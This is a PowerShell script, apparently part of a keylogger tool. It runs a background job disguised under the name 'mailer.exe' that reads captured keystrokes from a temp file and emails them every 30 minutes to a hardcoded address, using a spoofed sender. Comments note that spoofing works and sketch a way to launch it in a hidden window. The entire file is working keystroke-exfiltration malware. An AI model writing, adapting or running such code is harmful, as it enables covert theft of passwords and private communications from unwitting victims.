### Splitted this script part because launching this script as a background process from the main part of the programm
# caused race conditions with the C# keylogger
$variableContainingScriptToBeExecutedAsString = '
function mail($messageBody){
		$smtpServer = "smtp.scarlet.be"
		 #Creating a Mail object
		 $msg = new-object Net.Mail.MailMessage

		 #Creating SMTP server object
		 $smtp = new-object Net.Mail.SmtpClient($smtpServer)
		 $smtp.Enablessl = $true
		 $smtp.port = 25
		 #Email structure 
		 ### !!!! From email can be spoofed
		 ### On 12/09/2018 you could still use any gmail account as sender and receiver (TESTED)
		 $msg.From = "powershell@scarlet.be"
		 $msg.To.Add("perselis.e@gmail.com")

		 $msg.subject = "Scrapper information"


		 $msg.IsBodyHTML = $false
		 $msg.body = $messageBody +""

		 $ok=$true 
		 Write-Host "SMTP Server:" $smtpserver "Port #:" $smtp.port "SSL Enabled?" $smtp.Enablessl
		 try{
				$smtp.Send($msg)
				Write-Host "SENT"

		 }
		 catch {
			$error[0]
			$_.Exception.Response
			$ok=$false
		 }
		 finally{
			$msg.Dispose()

		 }
		 if($ok){
			Write-Host "EVERYTHING PASSED"
		 }

	}
	echo "Starting mailer" | out-file .\log.txt
	$keyloggerLogFilePath = $env:temp+"\keylogger.txt"
	while($true)
	{
		
		try{
			if([System.IO.File]::Exists($keyloggerLogFilePath)){
					$keyloggerFileContents = type $keyloggerLogFilePath
					mail $keyloggerFileContents
					echo "sending mail" | out-file .\log.txt
			}
			else{
				"Keylogger log does not exist"
				mail "Keylogger log does not exist"
				exit
			}		
		#sleep on the end to send the first result imediately		
		#30 minutes
		Sleep (30 * 60)
		}
		catch{
			"Keylogger job is not created"
			mail "Keylogger job is not created (catch)"
			exit
		}
	}
	'
	$command = '$scriptBlockVar ='+$variableContainingScriptToBeExecutedAsString+'
	Invoke-Expression $scriptBlockVar'
	$scriptBlock = [scriptblock]::Create($command)
	### Starts script block in background and saves job as variable
	### Job is killed if parent quits with this method
	
	$job = start-Job -scriptblock $scriptBlock -Name "mailer.exe"
	Sleep 1
	### Checks if mailer is running
	$results = "`nMailer status. `n"
	if($job.state -eq "Running"){
		$results += "Mailer is Running..."
		
	}else {
		$results +="Mailer is NOT running"
	}
	
	### This problem could be solved by using this : Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -windowstyle hidden -nologo -command "" Sleep 300"""
	### BUGS IN PARSING. THIS LINE DOES NOT WORK AS EXPECTED
	###Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -windowstyle hidden -nologo -command $scriptBlock"
	$results += "`n"
	$results
	while($true)
	{Sleep 1}
